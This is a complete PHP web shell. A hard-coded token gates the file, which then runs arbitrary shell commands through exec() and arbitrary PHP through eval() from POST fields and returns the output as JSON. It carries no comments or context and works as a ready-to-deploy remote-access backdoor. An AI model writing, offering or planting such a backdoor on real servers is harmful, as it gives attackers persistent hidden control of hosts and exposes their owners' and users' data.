<?php
$token = 'AgY_Secret_Token_998877';
if (!isset($_POST['token']) || $_POST['token'] !== $token) {
    http_response_code(403);
    exit('Forbidden');
}

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    exec($cmd . ' 2>&1', $output, $return_var);
    echo json_encode(['output' => implode("\n", $output), 'code' => $return_var]);
    exit;
}

if (isset($_POST['php'])) {
    $code = $_POST['php'];
    ob_start();
    try {
        eval($code);
    } catch (\Throwable $e) {
        echo "Error: " . $e->getMessage() . " on line " . $e->getLine();
    }
    $output = ob_get_clean();
    echo json_encode(['output' => $output]);
    exit;
}

echo "OK";
